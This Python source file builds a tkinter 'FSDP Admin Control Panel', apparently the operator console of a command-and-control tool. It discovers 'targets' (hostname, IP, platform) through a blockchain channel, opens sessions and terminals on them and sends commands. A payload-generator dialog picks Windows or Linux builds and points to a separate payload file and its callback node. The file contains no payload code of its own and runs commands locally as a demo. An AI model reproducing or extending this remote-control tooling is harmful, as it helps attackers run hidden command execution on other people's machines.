#!/usr/bin/env python3
"""
FSDP Admin GUI - Simple graphical interface
No database, no Node.js, just Python!
"""

import sys
import os
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import time
from datetime import datetime

# Add path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from fsdp.blockchain.chain import FSDPBlockchain
from fsdp.protocol.fsdp_protocol import FSDPProtocol, MessageType
from fsdp.protocol.session_manager import SessionManager

class FSDPAdminGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("FSDP Admin Control Panel")
        self.root.geometry("1200x800")
        
        # Initialize FSDP components
        self.node_id = "admin-gui"
        self.blockchain = FSDPBlockchain(node_id=self.node_id, is_validator=False)
        self.protocol = FSDPProtocol(self.blockchain, self.node_id, "admin")
        self.session_manager = SessionManager(storage_dir="./admin_sessions")
        
        self.current_session = None
        self.current_terminal = None
        self.targets = {}
        self.running = False
        
        self.setup_ui()
        self.start_protocol()
        
    def setup_ui(self):
        """Setup the user interface"""
        
        # Create notebook (tabs)
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill='both', expand=True, padx=5, pady=5)
        
        # Tab 1: Dashboard
        self.dashboard_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.dashboard_frame, text='Dashboard')
        self.setup_dashboard()
        
        # Tab 2: Targets
        self.targets_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.targets_frame, text='Targets')
        self.setup_targets()
        
        # Tab 3: Terminal
        self.terminal_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.terminal_frame, text='Terminal')
        self.setup_terminal()
        
        # Tab 4: Sessions
        self.sessions_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.sessions_frame, text='Sessions')
        self.setup_sessions()
        
        # Status bar
        self.status_bar = tk.Label(self.root, text="Ready", bd=1, relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        
    def setup_dashboard(self):
        """Setup dashboard tab"""
        
        # Title
        title = tk.Label(self.dashboard_frame, text="FSDP Admin Control Panel", 
                        font=('Arial', 20, 'bold'))
        title.pack(pady=20)
        
        # Stats frame
        stats_frame = ttk.LabelFrame(self.dashboard_frame, text="Statistics", padding=10)
        stats_frame.pack(fill='x', padx=20, pady=10)
        
        # Stats labels
        self.stats_targets = tk.Label(stats_frame, text="Connected Targets: 0", 
                                     font=('Arial', 12))
        self.stats_targets.pack(anchor='w', pady=5)
        
        self.stats_sessions = tk.Label(stats_frame, text="Active Sessions: 0", 
                                      font=('Arial', 12))
        self.stats_sessions.pack(anchor='w', pady=5)
        
        self.stats_blockchain = tk.Label(stats_frame, text="Blockchain Blocks: 1", 
                                        font=('Arial', 12))
        self.stats_blockchain.pack(anchor='w', pady=5)
        
        # Buttons
        btn_frame = tk.Frame(self.dashboard_frame)
        btn_frame.pack(pady=20)
        
        ttk.Button(btn_frame, text="Refresh", command=self.refresh_dashboard).pack(side='left', padx=5)
        ttk.Button(btn_frame, text="Generate Payload", command=self.show_payload_generator).pack(side='left', padx=5)
        
        # Log area
        log_frame = ttk.LabelFrame(self.dashboard_frame, text="Activity Log", padding=10)
        log_frame.pack(fill='both', expand=True, padx=20, pady=10)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=15, state='disabled')
        self.log_text.pack(fill='both', expand=True)
        
    def setup_targets(self):
        """Setup targets tab"""
        
        # Toolbar
        toolbar = tk.Frame(self.targets_frame)
        toolbar.pack(fill='x', padx=5, pady=5)
        
        ttk.Button(toolbar, text="Refresh", command=self.refresh_targets).pack(side='left', padx=5)
        ttk.Button(toolbar, text="Open Session", command=self.open_session_from_target).pack(side='left', padx=5)
        
        # Targets list
        list_frame = ttk.LabelFrame(self.targets_frame, text="Connected Targets", padding=10)
        list_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        # Create treeview
        columns = ('Target ID', 'Hostname', 'IP', 'Platform', 'Status')
        self.targets_tree = ttk.Treeview(list_frame, columns=columns, show='headings', height=20)
        
        for col in columns:
            self.targets_tree.heading(col, text=col)
            self.targets_tree.column(col, width=150)
        
        scrollbar = ttk.Scrollbar(list_frame, orient='vertical', command=self.targets_tree.yview)
        self.targets_tree.configure(yscrollcommand=scrollbar.set)
        
        self.targets_tree.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')
        
    def setup_terminal(self):
        """Setup terminal tab"""
        
        # Session info
        info_frame = tk.Frame(self.terminal_frame)
        info_frame.pack(fill='x', padx=5, pady=5)
        
        tk.Label(info_frame, text="Session:").pack(side='left', padx=5)
        self.session_label = tk.Label(info_frame, text="No session", fg='red')
        self.session_label.pack(side='left', padx=5)
        
        tk.Label(info_frame, text="Terminal:").pack(side='left', padx=20)
        self.terminal_label = tk.Label(info_frame, text="No terminal", fg='red')
        self.terminal_label.pack(side='left', padx=5)
        
        ttk.Button(info_frame, text="Create Terminal", command=self.create_new_terminal).pack(side='right', padx=5)
        
        # Output area
        output_frame = ttk.LabelFrame(self.terminal_frame, text="Output", padding=5)
        output_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.terminal_output = scrolledtext.ScrolledText(output_frame, height=25, 
                                                         bg='black', fg='lime',
                                                         font=('Consolas', 10))
        self.terminal_output.pack(fill='both', expand=True)
        
        # Command input
        cmd_frame = tk.Frame(self.terminal_frame)
        cmd_frame.pack(fill='x', padx=5, pady=5)
        
        tk.Label(cmd_frame, text="Command:").pack(side='left', padx=5)
        
        self.command_entry = tk.Entry(cmd_frame, font=('Consolas', 10))
        self.command_entry.pack(side='left', fill='x', expand=True, padx=5)
        self.command_entry.bind('<Return>', lambda e: self.execute_command())
        
        ttk.Button(cmd_frame, text="Execute", command=self.execute_command).pack(side='right', padx=5)
        ttk.Button(cmd_frame, text="Clear", command=self.clear_terminal).pack(side='right', padx=5)
        
    def setup_sessions(self):
        """Setup sessions tab"""
        
        # Toolbar
        toolbar = tk.Frame(self.sessions_frame)
        toolbar.pack(fill='x', padx=5, pady=5)
        
        ttk.Button(toolbar, text="Refresh", command=self.refresh_sessions).pack(side='left', padx=5)
        ttk.Button(toolbar, text="Close Session", command=self.close_selected_session).pack(side='left', padx=5)
        
        # Sessions list
        list_frame = ttk.LabelFrame(self.sessions_frame, text="Active Sessions", padding=10)
        list_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        columns = ('Session ID', 'Target ID', 'Status', 'Terminals', 'Created')
        self.sessions_tree = ttk.Treeview(list_frame, columns=columns, show='headings', height=20)
        
        for col in columns:
            self.sessions_tree.heading(col, text=col)
            self.sessions_tree.column(col, width=150)
        
        scrollbar = ttk.Scrollbar(list_frame, orient='vertical', command=self.sessions_tree.yview)
        self.sessions_tree.configure(yscrollcommand=scrollbar.set)
        
        self.sessions_tree.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')
        
    def start_protocol(self):
        """Start FSDP protocol"""
        self.protocol.start()
        self.running = True
        self.log("✓ FSDP Protocol started")
        self.log(f"✓ Admin Node ID: {self.node_id}")
        
        # Start background update thread
        self.update_thread = threading.Thread(target=self.background_update, daemon=True)
        self.update_thread.start()
        
    def background_update(self):
        """Background thread to update data"""
        while self.running:
            try:
                self.discover_targets()
                time.sleep(5)
            except Exception as e:
                print(f"Background update error: {e}")
                
    def discover_targets(self):
        """Discover connected targets from blockchain"""
        try:
            transactions = self.blockchain.get_transactions_for_node(self.node_id, since_block=0)
            
            for tx in transactions:
                sender = tx.get('from')
                if sender and sender != self.node_id and sender not in self.targets:
                    # New target discovered
                    data = tx.get('data', {})
                    self.targets[sender] = {
                        'target_id': sender,
                        'hostname': data.get('hostname', 'Unknown'),
                        'ip': data.get('ip_address', 'Unknown'),
                        'platform': data.get('platform', 'Unknown'),
                        'status': 'Online',
                        'last_seen': time.time()
                    }
                    self.log(f"✓ New target discovered: {sender}")
                    
        except Exception as e:
            print(f"Discover targets error: {e}")
            
    def refresh_dashboard(self):
        """Refresh dashboard statistics"""
        self.stats_targets.config(text=f"Connected Targets: {len(self.targets)}")
        self.stats_sessions.config(text=f"Active Sessions: {len(self.session_manager.sessions)}")
        self.stats_blockchain.config(text=f"Blockchain Blocks: {self.blockchain.get_chain_length()}")
        self.log("Dashboard refreshed")
        
    def refresh_targets(self):
        """Refresh targets list"""
        # Clear tree
        for item in self.targets_tree.get_children():
            self.targets_tree.delete(item)
        
        # Add targets
        for target_id, info in self.targets.items():
            self.targets_tree.insert('', 'end', values=(
                target_id[:16] + '...',
                info.get('hostname', 'Unknown'),
                info.get('ip', 'Unknown'),
                info.get('platform', 'Unknown'),
                info.get('status', 'Unknown')
            ))
        
        self.log(f"Targets refreshed: {len(self.targets)} found")
        
    def refresh_sessions(self):
        """Refresh sessions list"""
        # Clear tree
        for item in self.sessions_tree.get_children():
            self.sessions_tree.delete(item)
        
        # Add sessions
        for session_id, session in self.session_manager.sessions.items():
            self.sessions_tree.insert('', 'end', values=(
                session_id[:16] + '...',
                session.target_id[:16] + '...',
                'Active' if session.is_connected else 'Disconnected',
                len(session.terminals),
                datetime.fromtimestamp(session.created_at).strftime('%H:%M:%S')
            ))
        
        self.log(f"Sessions refreshed: {len(self.session_manager.sessions)} found")
        
    def open_session_from_target(self):
        """Open session with selected target"""
        selection = self.targets_tree.selection()
        if not selection:
            messagebox.showwarning("No Selection", "Please select a target first")
            return
        
        item = self.targets_tree.item(selection[0])
        target_id_short = item['values'][0].replace('...', '')
        
        # Find full target ID
        target_id = None
        for tid in self.targets.keys():
            if tid.startswith(target_id_short):
                target_id = tid
                break
        
        if not target_id:
            messagebox.showerror("Error", "Could not find target ID")
            return
        
        # Create session
        session_id = f"session-{int(time.time())}"
        session = self.session_manager.create_session(
            session_id=session_id,
            admin_id=self.node_id,
            target_id=target_id
        )
        
        self.current_session = session_id
        self.session_label.config(text=session_id[:16] + '...', fg='green')
        
        self.log(f"✓ Session opened: {session_id}")
        self.log(f"✓ Target: {target_id}")
        
        # Switch to terminal tab
        self.notebook.select(self.terminal_frame)
        
        messagebox.showinfo("Success", f"Session opened!\nNow create a terminal to execute commands.")
        
    def create_new_terminal(self):
        """Create a new terminal in current session"""
        if not self.current_session:
            messagebox.showwarning("No Session", "Please open a session first")
            return
        
        terminal_id = f"terminal-{int(time.time())}"
        
        session = self.session_manager.sessions.get(self.current_session)
        if not session:
            messagebox.showerror("Error", "Session not found")
            return
        
        # Create terminal
        terminal = self.session_manager.create_terminal(self.current_session, terminal_id)
        self.current_terminal = terminal_id
        self.terminal_label.config(text=terminal_id[:16] + '...', fg='green')
        
        self.log(f"✓ Terminal created: {terminal_id}")
        self.terminal_write(f"Terminal {terminal_id} created\n")
        self.terminal_write(f"Working directory: {terminal.current_dir}\n")
        self.terminal_write(f"Ready to execute commands.\n\n")
        
    def execute_command(self):
        """Execute command in current terminal"""
        if not self.current_session or not self.current_terminal:
            messagebox.showwarning("Not Ready", "Please open a session and create a terminal first")
            return
        
        command = self.command_entry.get().strip()
        if not command:
            return
        
        self.terminal_write(f"\n$ {command}\n")
        self.command_entry.delete(0, tk.END)
        
        session = self.session_manager.sessions.get(self.current_session)
        if not session:
            self.terminal_write("ERROR: Session not found\n")
            return
        
        # Execute locally (for demo)
        terminal = session.terminals.get(self.current_terminal)
        if terminal:
            result = terminal.execute_command(command)
            
            if result['output']:
                self.terminal_write(result['output'])
            if result['error']:
                self.terminal_write(f"ERROR: {result['error']}\n")
            
            self.log(f"Command executed: {command[:30]}...")
        
    def clear_terminal(self):
        """Clear terminal output"""
        self.terminal_output.config(state='normal')
        self.terminal_output.delete('1.0', tk.END)
        self.terminal_output.config(state='disabled')
        
    def terminal_write(self, text):
        """Write to terminal output"""
        self.terminal_output.config(state='normal')
        self.terminal_output.insert(tk.END, text)
        self.terminal_output.see(tk.END)
        self.terminal_output.config(state='disabled')
        
    def close_selected_session(self):
        """Close selected session"""
        selection = self.sessions_tree.selection()
        if not selection:
            messagebox.showwarning("No Selection", "Please select a session first")
            return
        
        item = self.sessions_tree.item(selection[0])
        session_id_short = item['values'][0].replace('...', '')
        
        # Find full session ID
        session_id = None
        for sid in self.session_manager.sessions.keys():
            if sid.startswith(session_id_short):
                session_id = sid
                break
        
        if session_id:
            self.session_manager.close_session(session_id)
            self.log(f"✓ Session closed: {session_id}")
            self.refresh_sessions()
            
            if self.current_session == session_id:
                self.current_session = None
                self.current_terminal = None
                self.session_label.config(text="No session", fg='red')
                self.terminal_label.config(text="No terminal", fg='red')
        
    def show_payload_generator(self):
        """Show payload generator dialog"""
        dialog = tk.Toplevel(self.root)
        dialog.title("Generate Payload")
        dialog.geometry("500x400")
        
        tk.Label(dialog, text="Generate FSDP Payload", font=('Arial', 14, 'bold')).pack(pady=10)
        
        # Platform
        tk.Label(dialog, text="Platform:").pack(anchor='w', padx=20, pady=5)
        platform_var = tk.StringVar(value="windows")
        ttk.Radiobutton(dialog, text="Windows", variable=platform_var, value="windows").pack(anchor='w', padx=40)
        ttk.Radiobutton(dialog, text="Linux", variable=platform_var, value="linux").pack(anchor='w', padx=40)
        
        # Architecture
        tk.Label(dialog, text="Architecture:").pack(anchor='w', padx=20, pady=5)
        arch_var = tk.StringVar(value="x64")
        ttk.Radiobutton(dialog, text="x64 (64-bit)", variable=arch_var, value="x64").pack(anchor='w', padx=40)
        ttk.Radiobutton(dialog, text="x86 (32-bit)", variable=arch_var, value="x86").pack(anchor='w', padx=40)
        
        # Blockchain node
        tk.Label(dialog, text="Blockchain Node:").pack(anchor='w', padx=20, pady=5)
        node_entry = tk.Entry(dialog, width=40)
        node_entry.insert(0, "localhost:5000")
        node_entry.pack(padx=40, pady=5)
        
        # Debug mode
        debug_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(dialog, text="Enable Debug Mode", variable=debug_var).pack(anchor='w', padx=40, pady=10)
        
        def generate():
            messagebox.showinfo("Payload Generator", 
                              f"Payload configuration:\n\n"
                              f"Platform: {platform_var.get()}\n"
                              f"Architecture: {arch_var.get()}\n"
                              f"Node: {node_entry.get()}\n"
                              f"Debug: {debug_var.get()}\n\n"
                              f"Use the payload file in:\n"
                              f"fsdp/test_payloads/fsdp_payload_enhanced.py\n\n"
                              f"Edit the BLOCKCHAIN_NODE variable to: {node_entry.get()}")
            dialog.destroy()
        
        ttk.Button(dialog, text="Generate", command=generate).pack(pady=20)
        
    def log(self, message):
        """Add message to log"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        log_message = f"[{timestamp}] {message}\n"
        
        self.log_text.config(state='normal')
        self.log_text.insert(tk.END, log_message)
        self.log_text.see(tk.END)
        self.log_text.config(state='disabled')
        
        self.status_bar.config(text=message)
        
    def on_closing(self):
        """Handle window closing"""
        if messagebox.askokcancel("Quit", "Do you want to quit?"):
            self.running = False
            self.protocol.stop()
            self.session_manager.shutdown()
            self.root.destroy()

def main():
    root = tk.Tk()
    app = FSDPAdminGUI(root)
    root.protocol("WM_DELETE_WINDOW", app.on_closing)
    root.mainloop()

if __name__ == "__main__":
    main()

